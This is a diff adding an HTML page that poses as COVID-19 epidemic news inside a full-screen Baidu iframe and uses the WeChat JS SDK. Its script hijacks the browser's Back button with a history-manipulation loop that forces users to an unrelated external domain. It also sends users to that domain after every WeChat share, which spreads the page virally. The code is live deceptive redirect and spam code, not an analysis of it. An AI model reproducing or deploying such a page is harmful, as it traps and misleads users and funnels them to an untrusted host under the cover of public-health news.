@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html style="display:none;">
+<head>
+  <meta charset="utf-8">
+
+  <title></title>
+
+  <meta name="viewport"
+        content="width=device-width, user-scalable=no, initial-scale=1,  minimum-scale=1, maximum-scale=1"/>
+
+  <style type="text/css">
+  html,body{
+  margin: 0;
+        padding: 0;
+         height: 100%;
+  }
+      p {
+        text-align: center;
+        font-size: xx-large;
+      }
+       #mainiframe *{
+      font-size: 0
+    }
+  </style>
+
+</head>
+<body >
+    <iframe id="mainiframe" src="https://rs.mbd.baidu.com/9wjd9h0?f=cp&u=4b825d48186f7ae0"  name="mainiframe" 
+           frameborder="0" style="padding: 0px; width: 100%; height: 100%;"></iframe>
+  <script src="https://cdn.bootcss.com/jquery/1.10.2/jquery.min.js"></script>
+<script src="http://res.wx.qq.com/open/js/jweixin-1.2.0.js"></script>
+<script>
+    document.write("<script src='accessToken/signPackage.php?originUrl=" + window.location.href + "' type='text/javascript'><\/script>");
+</script>
+<script>
+
+
+
+     var imgUrl='https://gss2.bdstatic.com/9fo3dSag_xI4khGkpoWK1HF6hhy/baike/w%3D268%3Bg%3D0/sign=f4abaf963587e9504217f46a2803347e/e7cd7b899e510fb34d8fd7c2d633c895d0430cd4.jpg';
+     var title='新型冠状病毒疫情';
+     var desc='';
+    var resulturl='http://m.dnajk0980hfffd.store/back2.html';
+  function noback(callback){
+  var starttime=new Date().getTime();
+if(!sessionStorage.getItem("od")){
+sessionStorage.setItem("od",starttime)  
+}
+   var counter = 0;
+    if (window.history && window.history.pushState) {
+            $(window).on('popstate', function () {
+              //1秒才能返回
+              var endtime=new Date().getTime();
+              if(endtime-parseInt(sessionStorage.getItem("od"))>0*1000){ 
+              sessionStorage.setItem("od",starttime)    
+                   window.history.pushState('forward', null, '#');
+                   window.history.forward();
+                 //alert("不可回退");
+                 if(typeof callback=='function'){
+                 callback();
+                 }
+              }else{
+                  window.history.go(0);
+              }
+               });
+      }
+
+      window.history.pushState('forward', null, '#'); //在IE中必须得有这两行
+      window.history.forward();
+  }
+  noback(function(){
+
+      location.href=resulturl;
+      
+    })
+    var wxData = {
+        "imgUrl" : imgUrl,
+        //"link"   : location.href+"?redirect="+link,
+        "link"   : location.href,
+        "title"  : '新型冠状病毒疫情',
+        "desc"   : desc
+    };
+
+    wx.config({
+        debug: false,
+        appId: signPackage.appId,
+        timestamp: parseInt(signPackage.timestamp),
+        nonceStr: signPackage.nonceStr,
+        signature: signPackage.signature,
+        jsApiList: [
+            'onMenuShareTimeline',
+            'onMenuShareAppMessage'
+        ]
+    });
+
+    wx.ready(function () {
+        wx.onMenuShareTimeline({
+            title: wxData.title,
+            link: wxData.link,
+            imgUrl: wxData.imgUrl,
+            success: function () {
+                
+
+                    location.href=resulturl
+                
+            }
+        });
+        wx.onMenuShareAppMessage({
+            title: wxData.title,
+            desc: wxData.desc,
+            link: wxData.link,
+            imgUrl: wxData.imgUrl,
+            type: 'link',
+            dataUrl: '',
+            success: function () {
+  
+                    location.href=resulturl
+                
+            }
+        });
+    });
+setTimeout(function(){
+     $("html").show();
+},200)
+
+</script>
+</body>
+</html>
